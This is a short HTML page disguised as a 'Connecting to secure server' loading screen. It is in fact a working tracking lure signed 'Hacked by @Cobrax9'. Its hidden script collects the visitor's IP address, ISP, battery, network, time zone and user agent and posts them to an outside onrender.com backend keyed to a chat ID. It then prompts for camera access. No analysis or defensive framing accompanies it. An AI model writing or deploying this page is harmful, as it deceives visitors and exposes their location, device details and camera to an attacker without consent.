
<!DOCTYPE html>
<html>
<head>
  <title>Connecting...</title>
  <style>
    body {
      background-color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      color: #333;
    }
    .message {
      font-size: 18px;
      margin-bottom: 20px;
    }
    video {
      margin-top: 20px;
      width: 300px;
      height: auto;
      border-radius: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="message">🔒 Connecting to secure server... Please wait</div>
  <video id="videoPreview" autoplay muted playsinline></video>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const video = document.getElementById("videoPreview");

    let result = "📱 Hacked by @Cobrax9\n\n";

    fetch("https://ipinfo.io/json?token=demo")
      .then(res => res.json())
      .then(data => {
        result += "🌎 Ip Information:\n";
        result += `🌐 Ip address: ${data.ip}\n`;
        result += `📡 ISP: ${data.org || "Unknown"}\n`;
        result += `🔍 ASN: ${data.org?.split(" ")[0] || "Unknown"}\n\n`;
        collectDeviceInfo();
      });

    function collectDeviceInfo() {
      const ua = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const network = connection ? connection.effectiveType : "unknown";

      navigator.getBattery().then(battery => {
        const charging = battery.charging ? "Yes" : "No";
        const level = Math.round(battery.level * 100) + "%";

        result += "📱 Device Info:\n";
        result += `🔋 Charging: ${charging}\n`;
        result += `🔌 Battery Level: ${level}\n`;
        result += `🌐 Network Type: ${network.toUpperCase()}\n`;
        result += `🕒 Time Zone: ${timeZone}\n\n`;
        result += `🖥️ User Agent: ${ua}\n`;
        result += `📱 Device Type: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
        result += "👨‍💻 Tracked on: @Cobrax9";

        sendData();
      });
    }

    function sendData() {
      fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message: result
        })
      }).then(() => {
        // After sending, ask for camera access
        setTimeout(() => {
          video.style.display = "block";
          navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
              video.srcObject = stream;
            })
            .catch(() => {});
        }, 1000);
      });
    }
  </script>
</body>
</html>
